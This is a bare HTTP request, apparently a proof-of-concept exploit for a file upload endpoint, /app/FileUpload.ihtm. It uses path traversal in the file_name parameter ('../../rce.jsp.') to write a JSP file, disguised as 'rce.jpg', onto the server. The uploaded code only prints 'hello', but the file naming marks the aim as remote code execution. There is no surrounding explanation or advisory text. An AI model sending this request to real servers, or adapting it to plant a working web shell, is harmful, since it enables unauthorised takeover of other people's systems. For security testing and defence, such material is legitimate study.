```
POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../rce.jsp. HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6

--WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"

<% out.println("hello");%>
--WebKitFormBoundaryHHaZAYecVOf5sfa6--
```

